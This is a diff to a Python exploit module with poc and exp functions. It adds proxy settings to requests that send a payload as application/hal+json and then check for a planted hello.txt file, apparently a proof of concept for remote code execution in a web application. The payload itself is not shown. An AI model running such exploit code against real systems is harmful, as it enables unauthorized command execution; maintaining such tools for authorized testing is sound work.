@@ -4,6 +4,7 @@
 import re
 import requests
 
+from Config.config_proxies import proxies
 from Config.config_requests import ua
 
 requests.packages.urllib3.disable_warnings()
@@ -24,8 +25,8 @@ def poc(target):
     headers = {"User-Agent":ua,
                "Content-Type": "application/hal+json"}
     try:
-        requests.post(url, headers=headers,data=payload, verify=False)
-        check = requests.get(target + '/hello.txt', verify=False)
+        requests.post(url, headers=headers,data=payload, verify=False,proxies=proxies)
+        check = requests.get(target + '/hello.txt', verify=False,proxies=proxies)
         if check.status_code == 200 and ";-)" in check.text:
             result['target']=target
             result['poc']=NAME
@@ -41,7 +42,7 @@ def exp(target,cmd):
     headers = {"User-Agent":ua,
                "Content-Type": "application/hal+json"}
     try:
-        requests.post(url, headers=headers,data=payload, verify=False)
+        requests.post(url, headers=headers,data=payload, verify=False,proxies=proxies)
     except:
         pass
 
